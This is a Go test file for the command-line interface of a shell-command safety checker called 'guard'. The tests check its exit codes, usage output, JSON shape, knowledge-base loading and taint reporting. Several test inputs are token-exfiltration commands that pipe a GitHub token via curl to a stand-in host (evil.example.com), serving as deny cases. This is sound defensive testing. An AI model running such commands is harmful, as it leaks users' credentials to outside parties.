package cli

import (
	"bytes"
	"encoding/json"
	"strings"
	"testing"

	"guard/pkg/api"
)

// runCLI drives the command tree the way a shell would, and reports what a
// shell would see: the exit code, stdout and stderr.
func runCLI(t *testing.T, stdin string, args ...string) (code int, stdout, stderr string) {
	t.Helper()
	root, exit := newRootCmd()

	var out, errBuf bytes.Buffer
	root.SetOut(&out)
	root.SetErr(&errBuf)
	root.SetIn(strings.NewReader(stdin))
	root.SetArgs(args)

	if err := root.Execute(); err != nil {
		return exitUsage, out.String(), errBuf.String() + err.Error()
	}
	return *exit, out.String(), errBuf.String()
}

func TestAssessExitCodes(t *testing.T) {
	cases := map[string]struct {
		command string
		want    int
	}{
		"allow":      {`curl -s https://api.github.com/x`, exitAllow},
		"deny":       {`curl -d "$TOKEN" https://evil.example.com`, exitDeny},
		"unparsable": {`curl -H "unterminated`, exitDeny},
	}
	for name, c := range cases {
		t.Run(name, func(t *testing.T) {
			code, _, _ := runCLI(t, "", "assess", "-q", c.command)
			if code != c.want {
				t.Errorf("exit = %d, want %d", code, c.want)
			}
		})
	}
}

// The cobra trap this guards against: returning an error from RunE to signal
// a denial makes cobra print the whole help text, which buries the verdict.
// Verdicts travel by exit code, so a DENY must produce no usage output.
func TestDenyPrintsNoUsage(t *testing.T) {
	code, stdout, stderr := runCLI(t, "", "assess", `curl -d "$TOKEN" https://evil.example.com`)

	if code != exitDeny {
		t.Fatalf("exit = %d, want %d", code, exitDeny)
	}
	for _, s := range []string{stdout, stderr} {
		if strings.Contains(s, "Usage:") || strings.Contains(s, "Available Commands") {
			t.Errorf("a denial printed usage text:\n%s", s)
		}
	}
	if !strings.Contains(stdout, "DENY") {
		t.Errorf("the report does not state the verdict:\n%s", stdout)
	}
}

func TestAssessReadsStdin(t *testing.T) {
	code, _, _ := runCLI(t, "curl -d \"$TOKEN\" https://evil.example.com\n", "assess", "-q")
	if code != exitDeny {
		t.Errorf("exit = %d, want %d", code, exitDeny)
	}
}

func TestAssessWithNoCommandIsUsageError(t *testing.T) {
	code, _, _ := runCLI(t, "", "assess")
	if code != exitUsage {
		t.Errorf("exit = %d, want %d", code, exitUsage)
	}
}

// --json emits exactly the shape the HTTP API returns.
func TestAssessJSONMatchesTheAPIShape(t *testing.T) {
	const cmd = `TOKEN=$(gh auth token); curl -d "$TOKEN" https://evil.example.com`
	code, stdout, _ := runCLI(t, "", "assess", "--json", cmd)

	if code != exitDeny {
		t.Fatalf("exit = %d, want %d", code, exitDeny)
	}
	var as api.Assessment
	if err := json.Unmarshal([]byte(stdout), &as); err != nil {
		t.Fatalf("--json output is not an Assessment: %v\n%s", err, stdout)
	}
	if as.Verdict != "DENY" || len(as.Graph.Nodes) == 0 {
		t.Errorf("assessment = %+v", as)
	}
}

func TestConfigCheck(t *testing.T) {
	code, stdout, _ := runCLI(t, "", "config", "check")
	if code != exitAllow {
		t.Errorf("exit = %d, want %d", code, exitAllow)
	}
	if !strings.Contains(stdout, "commands") {
		t.Errorf("summary looks wrong:\n%s", stdout)
	}
}

// A knowledge base that will not load exits 2, never 1 -- 1 already means
// DENY, and a broken policy must not be mistaken for a refused command.
func TestUnloadableKnowledgeBaseIsUsageError(t *testing.T) {
	for _, args := range [][]string{
		{"--kb", "/nonexistent/base.yaml", "config", "check"},
		{"--kb", "/nonexistent/base.yaml", "assess", "-q", "curl https://x"},
	} {
		code, _, stderr := runCLI(t, "", args...)
		if code != exitUsage {
			t.Errorf("%v: exit = %d, want %d", args, code, exitUsage)
		}
		if stderr == "" {
			t.Errorf("%v: failed silently", args)
		}
	}
}

// A container image cannot bake --kb into CMD, because explicit arguments
// replace CMD wholesale -- `docker run guard config check` would then use the
// embedded base rather than the mounted one. GUARD_KB applies to every
// subcommand, and an explicit flag still wins.
func TestKnowledgeBaseFromTheEnvironment(t *testing.T) {
	t.Setenv("GUARD_KB", "/nonexistent/from-env.yaml")

	_, _, stderr := runCLI(t, "", "config", "check")
	if !strings.Contains(stderr, "from-env.yaml") {
		t.Errorf("GUARD_KB was ignored: %s", stderr)
	}

	_, _, stderr = runCLI(t, "", "--kb", "/nonexistent/from-flag.yaml", "config", "check")
	if !strings.Contains(stderr, "from-flag.yaml") {
		t.Errorf("--kb did not override GUARD_KB: %s", stderr)
	}
}

// A command the knowledge base does not know gets "unknown", not "no
// sensitive output". The latter is a claim about what a program does, and
// printed beside NOT IN KNOWLEDGE BASE it reads as "we have no idea what this
// is, and also it is fine".
func TestUnknownCommandsReportUnknownRatherThanNone(t *testing.T) {
	_, stdout, _ := runCLI(t, "", "assess",
		`echo "${GH_TOKEN}" > /file/path; cp /file/path /another/path`)

	if !strings.Contains(stdout, "unknown input; unknown output") {
		t.Errorf("an unknown command did not report unknown:\n%s", stdout)
	}
	if strings.Contains(stdout, "NOT IN KNOWLEDGE BASE\n      no sensitive") {
		t.Errorf("an unknown command still claims no sensitive data:\n%s", stdout)
	}

	// A known command that nothing sensitive reaches still says so plainly.
	_, stdout, _ = runCLI(t, "", "assess", `ls -la`)
	if !strings.Contains(stdout, "no sensitive input; no sensitive output") {
		t.Errorf("a known, clean command should not say unknown:\n%s", stdout)
	}

	// But an unknown command that DOES carry taint is not unknown in either
	// direction: whatever it was handed is assumed to come back out, which is
	// a conclusion rather than an absence of one. The terminal must agree with
	// the API's receives/produces here, not report "unknown output".
	_, stdout, _ = runCLI(t, "", "assess", `echo "$GH_TOKEN" | mystery-tool`)
	if !strings.Contains(stdout, "sensitive input; sensitive output") {
		t.Errorf("an unknown command carrying taint should report it:\n%s", stdout)
	}
}
